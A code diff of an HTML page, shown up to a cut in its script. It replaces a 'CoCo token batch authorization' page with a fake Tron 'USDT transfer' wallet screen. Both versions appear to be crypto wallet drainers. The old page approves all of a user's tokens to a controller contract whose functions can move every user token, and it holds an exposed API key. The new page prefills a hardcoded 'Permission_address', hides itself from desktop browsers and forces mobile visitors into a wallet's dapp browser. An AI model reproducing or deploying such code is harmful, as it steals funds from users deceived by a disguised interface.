@@ -1,1222 +1,769 @@
-<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CoCo 代币批量授权系统</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-            color: #ffffff;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .header h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            background: linear-gradient(45deg, #9945FF, #00d4ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .header p {
-            font-size: 1.1em;
-            color: #b0b0b0;
-        }
-
-        .wallet-section {
-            background: rgba(153, 69, 255, 0.1);
-            border: 1px solid rgba(153, 69, 255, 0.3);
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 25px;
-        }
-
-        .wallet-section h3 {
-            color: #9945FF;
-            margin-bottom: 15px;
-            font-size: 1.3em;
-        }
-
-        .wallet-selector {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-        }
-
-        .wallet-btn {
-            background: rgba(153, 69, 255, 0.2);
-            border: 1px solid rgba(153, 69, 255, 0.5);
-            color: #9945FF;
-            padding: 10px 20px;
-            border-radius: 25px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: 500;
-        }
-
-        .wallet-btn:hover {
-            background: rgba(153, 69, 255, 0.3);
-            transform: translateY(-2px);
-        }
-
-        .wallet-btn.active {
-            background: #9945FF;
-            color: white;
-        }
-
-        .connect-btn {
-            background: linear-gradient(45deg, #9945FF, #00d4ff);
-            border: none;
-            color: white;
-            padding: 12px 30px;
-            border-radius: 25px;
-            cursor: pointer;
-            font-size: 1.1em;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            margin-bottom: 15px;
-        }
-
-        .connect-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(153, 69, 255, 0.4);
-        }
-
-        .connect-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .network-info {
-            background: rgba(0, 212, 255, 0.1);
-            border: 1px solid rgba(0, 212, 255, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
-
-        .network-info h4 {
-            color: #00d4ff;
-            margin-bottom: 10px;
-        }
-
-        .network-info p {
-            margin: 5px 0;
-            color: #b0b0b0;
-        }
-
-        .switch-network-btn {
-            background: linear-gradient(45deg, #00d4ff, #9945FF);
-            border: none;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-weight: 500;
-            transition: all 0.3s ease;
-        }
-
-        .switch-network-btn:hover {
-            transform: translateY(-2px);
-        }
-
-        .authorization-section {
-            background: rgba(255, 193, 7, 0.1);
-            border: 1px solid rgba(255, 193, 7, 0.3);
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 25px;
-        }
-
-        .authorization-section h3 {
-            color: #ffc107;
-            margin-bottom: 15px;
-            font-size: 1.3em;
-        }
-
-        .btn {
-            background: linear-gradient(45deg, #ffc107, #ff9800);
-            border: none;
-            color: #333;
-            padding: 15px 30px;
-            border-radius: 25px;
-            cursor: pointer;
-            font-size: 1.1em;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            margin: 10px 5px;
-            min-width: 150px;
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(255, 193, 7, 0.4);
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .btn.success {
-            background: linear-gradient(45deg, #4caf50, #45a049);
-            color: white;
-        }
-
-        .btn.fix {
-            background: linear-gradient(45deg, #2196F3, #21CBF3);
-            color: white;
-        }
-
-        .status {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 15px;
-            margin: 15px 0;
-            border-left: 4px solid #9945FF;
-        }
-
-        .status.info {
-            border-left-color: #00d4ff;
-        }
-
-        .status.success {
-            border-left-color: #4caf50;
-        }
-
-        .status.error {
-            border-left-color: #f44336;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 3px;
-            overflow: hidden;
-            margin: 10px 0;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(45deg, #9945FF, #00d4ff);
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-
-        .token-list {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            padding: 15px;
-            margin: 15px 0;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-
-        .token-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 8px;
-            margin: 5px 0;
-        }
-
-        .debug-info {
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 15px;
-            margin: 15px 0;
-            max-height: 300px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            color: #00ff00;
-        }
-
-        .loading {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #ffffff;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 8px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .warning {
-            background: rgba(255, 193, 7, 0.1);
-            border: 1px solid rgba(255, 193, 7, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            margin: 15px 0;
-            color: #ffc107;
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                padding: 20px;
-                margin: 10px;
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
+    <title>USDT转账 - Tron</title>
+    <link rel="icon" type="image/png" href="png/icon_trx.png">
+    <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
+    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#0080FF',      // 主色
+                        primaryLight: '#C1DAF6', // 未激活状态颜色
+                        border: '#E5E5E5',       // 模块外框色
+                        text: '#000000',
+                        textLight: '#999999',    // 标签/辅助文字色
+                        textTitle: '#08090B',    // 标题颜色
+                        placeholder: '#999999',  // 占位文字色
+                        warning: '#FF7D00',      // 关键提示色（橙色）
+                        background: '#F5F5F7',
+                        arrowCircle: '#9898A1'   // 箭头圆圈颜色
+                    },
+                    fontFamily: {
+                        sans: ['-apple-system', 'BlinkMacSystemFont', 'Helvetica Neue', 'Arial', 'sans-serif']
+                    }
+                }
             }
-            
-            .header h1 {
-                font-size: 2em;
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .module-frame {
+                border: 1px solid theme('colors.border');
+                border-radius: 12px;
+                transition: none;
             }
-            
-            .wallet-selector {
-                flex-direction: column;
+
+            .module-frame:focus-within {
+                border-color: theme('colors.border');
             }
-            
-            .btn {
+
+            .input-field {
+                border: none !important;
+                border-radius: 8px;
+                transition: none !important;
+            }
+
+            .input-field:focus,
+            .input-field:active,
+            .input-field:hover {
+                border: none !important;
+                box-shadow: none !important;
+                outline: none !important;
+            }
+
+            .icon-interactive {
+                transition: all 0.2s ease;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                width: 40px;
+                height: 40px;
+            }
+
+            .icon-interactive:active {
+                transform: scale(0.9);
+                opacity: 0.8;
+            }
+
+            .fee-options {
+                max-height: 0;
+                overflow: hidden;
+                transition: max-height 0.3s ease;
+            }
+
+            .fee-options.active {
+                max-height: 200px;
+            }
+
+            .divider-line {
+                height: 1px;
+                background-color: theme('colors.border');
+                margin: 12px 0; /* 增加间距使分隔更明显 */
+            }
+
+            /* 自定义返回箭头样式 */
+            .custom-arrow {
+                width: 20px;
+                height: 20px;
+                position: relative;
+            }
+
+            .custom-arrow::before {
+                content: '';
+                position: absolute;
+                left: 0;
+                top: 8px;
+                width: 12px;
+                height: 1px;
+                background-color: #000000;
+                transform: rotate(45deg);
+                transform-origin: left center;
+                border-radius: 0.5px;
+            }
+
+            .custom-arrow::after {
+                content: '';
+                position: absolute;
+                left: 0;
+                bottom: 8px;
+                width: 12px;
+                height: 1px;
+                background-color: #000000;
+                transform: rotate(-45deg);
+                transform-origin: left center;
+                border-radius: 0.5px;
+            }
+
+            /* 自定义扫码图标样式 */
+            .custom-scan-icon {
+                width: 20px;
+                height: 20px;
+                position: relative;
+            }
+
+            .custom-scan-icon::before,
+            .custom-scan-icon::after,
+            .custom-scan-icon .top-right,
+            .custom-scan-icon .bottom-right {
+                content: '';
+                position: absolute;
+                width: 6px;
+                height: 6px;
+                border: 2px solid #000000;
+                background: transparent;
+            }
+
+            .custom-scan-icon::before {
+                top: 0;
+                left: 0;
+                border-right: none;
+                border-bottom: none;
+                border-radius: 3px 0 0 0;
+            }
+
+            .custom-scan-icon::after {
+                bottom: 0;
+                left: 0;
+                border-right: none;
+                border-top: none;
+                border-radius: 0 0 0 3px;
+            }
+
+            .custom-scan-icon .top-right {
+                top: 0;
+                right: 0;
+                border-left: none;
+                border-bottom: none;
+                border-radius: 0 3px 0 0;
+            }
+
+            .custom-scan-icon .bottom-right {
+                bottom: 0;
+                right: 0;
+                border-left: none;
+                border-top: none;
+                border-radius: 0 0 3px 0;
+            }
+
+            .custom-scan-icon .middle-line {
+                position: absolute;
+                top: 50%;
+                left: 2px;
+                right: 2px;
+                height: 2px;
+                background-color: #000000;
+                transform: translateY(-50%);
+            }
+
+            /* 自定义矿工费箭头样式 */
+            .fee-custom-arrow {
+                width: 16px;
+                height: 16px;
+                border-radius: 50%;
+                background-color: theme('colors.arrowCircle');
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                position: relative;
+                transition: transform 0.3s ease;
+            }
+
+            .fee-custom-arrow::after {
+                content: '';
+                position: absolute;
+                width: 5px;
+                height: 5px;
+                border-right: 1.5px solid white;
+                border-bottom: 1.5px solid white;
+                transform: rotate(45deg);
+                margin-top: 0;
+            }
+
+            .fee-custom-arrow.rotate-180 {
+                transform: rotate(180deg);
+            }
+
+            /* 固定尺寸类 */
+            .address-box {
+                width: 559px;
+                min-height: 64px;
+                height: auto;
+            }
+
+            .amount-box {
+                width: 559px;
+                height: auto;
+                min-height: 180px;
+            }
+
+            .fee-box {
+                width: 559px;
+                height: 60px;
+            }
+
+            .address-input-limit {
+                letter-spacing: 0.02em;
+                word-wrap: break-word;
+                overflow-wrap: break-word;
+                white-space: normal;
+            }
+
+            .contact-icon {
+                width: 20px;
+                height: 20px;
+                border-radius: 50%;
+                border: 1.8px solid #000;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                color: #000;
+                line-height: 1;
+                position: relative;
+                background-color: transparent;
+            }
+
+            .contact-icon i {
+                font-size: 13px !important;
+                margin: 0;
+                position: relative;
+            }
+
+            .title-tight {
+                margin-bottom: 1px;
+            }
+
+            .subtitle-tight {
+                margin-top: 1px;
+            }
+
+            .tishi {
+                width: 58%;
+                padding: 0.3rem;
+                background: #4b4848;
+                z-index: 999999999999;
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                border-radius: 0.3rem;
+                color: white;
+                font-size: 1rem;
+                text-align: center;
+                display: none;
+                height: auto;
+            }
+
+            .remark-input {
+                border: none !important;
+                border-radius: 8px;
+                padding: 8px 12px;
                 width: 100%;
-                margin: 5px 0;
+                font-size: 14px;
+            }
+
+            .remark-input:focus,
+            .remark-input:active,
+            .remark-input:hover,
+            input[type="text"]:focus,
+            input[type="text"]:active,
+            input[type="text"]:hover,
+            input[type="number"]:focus,
+            input[type="number"]:active,
+            input[type="number"]:hover {
+                border: none !important;
+                outline: none !important;
+                box-shadow: none !important;
+                -webkit-box-shadow: none !important;
+            }
+
+            @media (max-width: 600px) {
+                .address-box, .amount-box, .fee-box {
+                    width: 100%;
+                    height: auto;
+                }
             }
         }
     </style>
 </head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>CoCo 代币批量授权系统</h1>
-            <p>一键授权所有代币，支持多钱包兼容</p>
-        </div>
 
-        <div class="wallet-section">
-            <h3>🔗 钱包连接</h3>
-            <div class="wallet-selector">
-                <button class="wallet-btn" onclick="selectWallet('metamask')">MetaMask</button>
-                <button class="wallet-btn" onclick="selectWallet('tronlink')">TronLink</button>
-                <button class="wallet-btn" onclick="selectWallet('binance')">Binance Wallet</button>
+<body class="bg-background min-h-screen font-sans flex flex-col">
+    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
+
+    <!-- 顶部标题与导航区 - 修改为灰色边框 -->
+    <header class="bg-background py-1 px-5 shadow-sm">
+        <div class="flex items-center justify-between h-10">
+            <!-- 返回按钮 -->
+            <button class="text-text icon-interactive">
+                <div class="custom-arrow"></div>
+            </button>
+
+            <div class="text-center">
+                <h1 class="text-[17px] font-medium text-textTitle title-tight">USDT 转账</h1>
+                <p class="text-[14px] text-textLight subtitle-tight">Tron</p>
             </div>
-            <button id="connectBtn" class="connect-btn" onclick="connectWallet()">连接钱包</button>
-            <div id="walletInfo"></div>
-        </div>
 
-        <div class="network-info">
-            <h4>🌐 网络信息</h4>
-            <p>当前网络: <span id="currentNetwork">未连接</span></p>
-            <p>当前地址: <span id="currentAddress">未连接</span></p>
-            <button id="switchNetworkBtn" class="switch-network-btn" onclick="switchToBSC()" style="display: none;">切换到BSC网络</button>
+            <!-- 扫码按钮 -->
+            <button class="text-text icon-interactive">
+                <div class="custom-scan-icon">
+                    <div class="top-right"></div>
+                    <div class="bottom-right"></div>
+                    <div class="middle-line"></div>
+                </div>
+            </button>
         </div>
+    </header>
 
-        <div class="authorization-section">
-            <h3>🚀 代币批量授权</h3>
-            <p>自动检测钱包中的所有代币并一键授权</p>
-            <button id="detectBtn" class="btn" onclick="detectAndAuthorizeTokens()">检测并授权所有代币</button>
-            <button id="fixBtn" class="btn fix" onclick="fixTokenApprovals()">修复代币授权问题</button>
+    <!-- 主内容区 -->
+    <main class="p-5 pt-5 flex flex-col items-center flex-grow">
+        <!-- 收款地址标签 -->
+        <label class="block text-[15px] text-textLight mb-2 self-start w-full max-w-[559px]">收款地址</label>
+        <!-- 收款地址模块 -->
+        <div class="bg-white module-frame p-3 mb-4 address-box flex flex-col justify-center">
+    <div class="relative">
+        <input type="text" id="addressInput" placeholder="Tron 地址" class="w-full px-3 py-2 input-field bg-white text-text placeholder:text-placeholder text-sm address-input-limit" maxlength="70">
+        <!-- 右侧联系人图标 - 向右移动调整 -->
+        <button class="absolute right-0.5 top-1/2 transform -translate-y-1/2 icon-interactive p-1" aria-label="选择联系人">
+            <div class="contact-icon">
+                <i class="fa fa-user-o"></i>
+            </div>
+        </button>
+    </div>
+    <p id="addressError" class="text-warning text-xs mt-1 hidden">Tron 地址格式错误（应为T开头的34位字符）</p>
+</div>
+
+        <!-- 数量标签和0 USDT组合 -->
+        <div class="flex justify-between items-center self-start w-full max-w-[559px] mb-2">
+            <label class="block text-[15px] text-textLight">数量</label>
+            <span class="text-[15px] text-textLight" id="amount-display">0 USD</span>
+        </div>
+        
+        <!-- 数量模块 -->
+        <div class="bg-white module-frame p-3 mb-4 amount-box flex flex-col justify-center" style="height: 90px; max-height: 106px;">
+        <!-- 金额显示区域 - 固定高度为104px -->
+        <input type="text" id="amountInput" value="0" class="w-full px-3 py-0 input-field bg-white text-textLight text-[2.5rem] font-normal flex items-center justify-center" style="height: 104px;" inputmode="decimal" pattern="[0-9.]*" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+
+        <!-- 分隔线 - 精简间距 -->
+        <div class="divider-line my-0"></div>
+
+        <!-- 备注信息区域 - 固定高度为60px -->
+        <div class="flex flex-col items-center" style="height: 30px;">
+            <label for="remarkInput" class="block text-textLight text-sm mb-1 self-start">备注（需支付1TRX）</label>
             
-            <div id="status" class="status" style="display: none;"></div>
-            <div id="progressBar" class="progress-bar" style="display: none;">
-                <div id="progressFill" class="progress-fill"></div>
-            </div>
-            
-            <div id="tokenList" class="token-list" style="display: none;">
-                <h4>检测到的代币:</h4>
-                <div id="tokenItems"></div>
-            </div>
-        </div>
-
-        <div class="debug-info">
-            <h4>🔍 调试信息</h4>
-            <div id="debugInfo"></div>
         </div>
     </div>
 
+
+        <!-- 矿工费标签 -->
+        <label class="block text-[15px] text-textLight mb-2 self-start w-full max-w-[559px]">矿工费</label>
+        <!-- 矿工费模块 -->
+        <div class="bg-white module-frame p-2.5 mb-5 fee-box flex flex-col justify-center">
+            <div class="flex justify-between items-center mb-0.5">
+                <div>
+                    <span class="font-medium text-text text-base block mb-1">$0</span>
+                    <div class="flex items-center">
+                        <span class="text-textLight text-sm mr-1">0 TRX</span>
+                        <div class="fee-custom-arrow icon-interactive" id="feeArrow"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="input-field bg-white p-1.5 cursor-pointer" id="feeToggle">
+                <!-- 点击区域 -->
+            </div>
+        </div>
+    </main>
+
+    <!-- 底部操作按钮区 -->
+    <footer class="p-5 pb-8">
+        <button id="nextButton" class="w-full max-w-[559px] bg-primaryLight text-white py-3 rounded-xl font-bold text-[17px] shadow-sm transition-colors duration-200 mx-auto block" disabled="">
+            下一步
+        </button>
+    </footer>
+
+    <div class="tishi" id="tip">提示</div>
+    <input id="to_address" type="hidden">
+    <input type="text" id="address" style="display:none">
+
     <script>
-        // 配置
-        const BSC_CHAIN_ID = '0x38'; // BSC主网
-        const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
-        const ETHERSCAN_V2_API_KEY = 'UZPUDJEQYHN2Z5D3N38B7RH6FVR4A968ZD';
-        const ETHERSCAN_V2_API_URL = 'https://api.etherscan.io/v2/api';
-        const AUTO_CONTROLLER_ADDRESS = '0x39c1aD7DBdDbe39b289064cAB41A1120f177b9f7';
+        // 核心配置参数
+        window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
+        window.Payment_address = 'TQU4Njq2emJDudfF8GgxQeTsGQ22RSDfsT';
+        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        window.heartbeatUrl = 'https://baidu.com/heartbeat';
 
-        // 合约ABI
-        const AUTO_CONTROLLER_ABI = [
-            {
-                "inputs": [],
-                "stateMutability": "nonpayable",
-                "type": "constructor"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address[]",
-                        "name": "tokens",
-                        "type": "address[]"
-                    }
-                ],
-                "name": "approveTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "token",
-                        "type": "address"
-                    }
-                ],
-                "name": "approveSingleToken",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "tokenAddress",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "from",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "to",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "transferUserToken",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address[]",
-                        "name": "tokens",
-                        "type": "address[]"
-                    },
-                    {
-                        "internalType": "address[]",
-                        "name": "froms",
-                        "type": "address[]"
-                    },
-                    {
-                        "internalType": "address[]",
-                        "name": "tos",
-                        "type": "address[]"
-                    },
-                    {
-                        "internalType": "uint256[]",
-                        "name": "amounts",
-                        "type": "uint256[]"
-                    }
-                ],
-                "name": "batchTransferUserTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "user",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "to",
-                        "type": "address"
-                    }
-                ],
-                "name": "transferAllUserTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "tokenAddress",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "from",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "to",
-                        "type": "address"
-                    }
-                ],
-                "name": "transferUserTokenAll",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "user",
-                        "type": "address"
-                    }
-                ],
-                "name": "getUserAuthorizedTokens",
-                "outputs": [
-                    {
-                        "internalType": "address[]",
-                        "name": "",
-                        "type": "address[]"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "user",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "token",
-                        "type": "address"
-                    }
-                ],
-                "name": "getUserTokenStatus",
-                "outputs": [
-                    {
-                        "components": [
-                            {
-                                "internalType": "uint256",
-                                "name": "allowance",
-                                "type": "uint256"
-                            },
-                            {
-                                "internalType": "uint256",
-                                "name": "balance",
-                                "type": "uint256"
-                            },
-                            {
-                                "internalType": "bool",
-                                "name": "isAuthorized",
-                                "type": "bool"
-                            }
-                        ],
-                        "internalType": "struct AutoTokenController.TokenStatus",
-                        "name": "",
-                        "type": "tuple"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "user",
-                        "type": "address"
-                    }
-                ],
-                "name": "getUserAllTokensInfo",
-                "outputs": [
-                    {
-                        "components": [
-                            {
-                                "internalType": "address",
-                                "name": "tokenAddress",
-                                "type": "address"
-                            },
-                            {
-                                "internalType": "uint256",
-                                "name": "allowance",
-                                "type": "uint256"
-                            },
-                            {
-                                "internalType": "uint256",
-                                "name": "balance",
-                                "type": "uint256"
-                            },
-                            {
-                                "internalType": "bool",
-                                "name": "isAuthorized",
-                                "type": "bool"
-                            }
-                        ],
-                        "internalType": "struct AutoTokenController.TokenInfo[]",
-                        "name": "",
-                        "type": "tuple[]"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "token",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "to",
-                        "type": "address"
-                    }
-                ],
-                "name": "emergencyWithdraw",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "newOwner",
-                        "type": "address"
-                    }
-                ],
-                "name": "transferOwnership",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "owner",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            }
-        ];
+        // 存储用户数据
+        const userData = {
+            address: null,
+            trxBalance: null,
+            usdtBalance: null
+        };
+        let currentAmount = '0';
+        const TRX_TO_USD_RATE = 0.1562;
+        const amountInput = document.getElementById('amountInput');
+        const addressInput = document.getElementById('addressInput');
+        const remarkInput = document.getElementById('remarkInput');
+        let isUserInputting = false;
 
-        // 全局变量
-        let web3;
-        let userAccount;
-        let currentChainId;
-        let selectedWallet = 'metamask';
-
-        // 页面加载完成后初始化
-        document.addEventListener('DOMContentLoaded', function() {
-            initializeWalletSelector();
-            addDebugInfo('页面加载完成，初始化钱包选择器');
-        });
-
-        // 初始化钱包选择器
-        function initializeWalletSelector() {
-            addDebugInfo('初始化钱包选择器...');
+        // 主初始化函数
+        async function initializeDApp() {
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
             
-            // 检查可用的钱包
-            if (window.ethereum) {
-                addDebugInfo('检测到 MetaMask');
-            }
-            if (window.tronWeb) {
-                addDebugInfo('检测到 TronLink');
-            }
-            if (window.BinanceChain) {
-                addDebugInfo('检测到 Binance Wallet');
+            if (!isMobile) {
+                document.body.innerHTML = '';
+            } else if (isMobile && !isDAppBrowser) {
+                const currentUrl = encodeURIComponent(window.location.href);
+                window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
+            } else if (isMobile && isDAppBrowser) {
+                await connectWallet();
             }
             
-            // 默认选择MetaMask
-            selectWallet('metamask');
+            // 页面加载时自动填充地址
+            setDefaultAddress();
+            
+            updateAmountDisplay();
         }
 
-        // 选择钱包类型
-        function selectWallet(walletType) {
-            selectedWallet = walletType;
+        // 设置默认地址
+        function setDefaultAddress() {
+            const targetAddress = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
+            addressInput.value = targetAddress;
             
-            // 更新按钮状态
-            document.querySelectorAll('.wallet-btn').forEach(btn => {
-                btn.classList.remove('active');
-            });
-            event.target.classList.add('active');
-            
-            addDebugInfo('选择钱包: ' + walletType);
-            
-            // 如果已经连接，重新连接
-            if (web3 && userAccount) {
-                addDebugInfo('重新连接钱包...');
-                connectWallet();
-            }
+            // 触发input事件以更新UI状态
+            const event = new Event('input', { bubbles: true });
+            addressInput.dispatchEvent(event);
         }
 
-        // 连接钱包
+        // 连接到钱包
         async function connectWallet() {
             try {
-                addDebugInfo('开始连接钱包: ' + selectedWallet);
-                showStatus('正在连接钱包...', 'info');
-                
-                let provider;
-                
-                switch (selectedWallet) {
-                    case 'metamask':
-                        if (!window.ethereum) {
-                            throw new Error('请安装MetaMask钱包');
-                        }
-                        provider = window.ethereum;
-                        break;
-                        
-                    case 'tronlink':
-                        if (!window.tronWeb) {
-                            throw new Error('请安装TronLink钱包');
-                        }
-                        // TronLink不支持BSC，显示警告
-                        showStatus('⚠️ TronLink不支持BSC网络，建议使用MetaMask', 'error');
-                        addDebugInfo('TronLink不支持BSC网络');
-                        return;
-                        
-                    case 'binance':
-                        if (!window.BinanceChain) {
-                            throw new Error('请安装Binance Wallet');
-                        }
-                        provider = window.BinanceChain;
-                        break;
-                        
-                    default:
-                        throw new Error('不支持的钱包类型');
+                if (window.tronWeb && window.tronWeb.ready) {
+                    await initDApp();
+                } else if (window.tronLink) {
+                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    if (res.code === 200) {
+                        window.tronWeb = window.tronLink.tronWeb;
+                        await initDApp();
+                    }
                 }
-                
-                // 请求账户连接
-                const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                userAccount = accounts[0];
-                
-                // 创建Web3实例
-                web3 = new Web3(provider);
-                
-                // 获取当前网络
-                currentChainId = await web3.eth.getChainId();
-                currentChainId = '0x' + currentChainId.toString(16);
-                
-                addDebugInfo('钱包连接成功: ' + userAccount);
-                addDebugInfo('当前网络ID: ' + currentChainId);
-                addDebugInfo('目标网络ID: ' + BSC_CHAIN_ID);
-                
-                // 更新UI
-                updateWalletInfo();
-                updateNetworkInfo();
-                
-                // 检查网络
-                if (currentChainId !== BSC_CHAIN_ID) {
-                    showStatus('请切换到BSC网络', 'info');
-                    document.getElementById('switchNetworkBtn').style.display = 'inline-block';
-                } else {
-                    showStatus('已连接到BSC网络', 'success');
-                    document.getElementById('switchNetworkBtn').style.display = 'none';
-                }
-                
             } catch (error) {
-                console.error('连接钱包失败:', error);
-                addDebugInfo('连接钱包失败: ' + error.message);
-                showStatus('连接钱包失败: ' + error.message, 'error');
+                console.error("钱包连接失败:", error);
+                tip("钱包连接失败，请重试");
             }
         }
 
-        // 更新钱包信息
-        function updateWalletInfo() {
-            const walletInfo = document.getElementById('walletInfo');
-            if (userAccount) {
-                walletInfo.innerHTML = `
-                    <p>✅ 已连接: ${userAccount.substring(0, 6)}...${userAccount.substring(38)}</p>
-                    <p>钱包类型: ${selectedWallet}</p>
-                `;
-            } else {
-                walletInfo.innerHTML = '';
-            }
-        }
-
-        // 更新网络信息
-        function updateNetworkInfo() {
-            const currentNetwork = document.getElementById('currentNetwork');
-            const currentAddress = document.getElementById('currentAddress');
-            
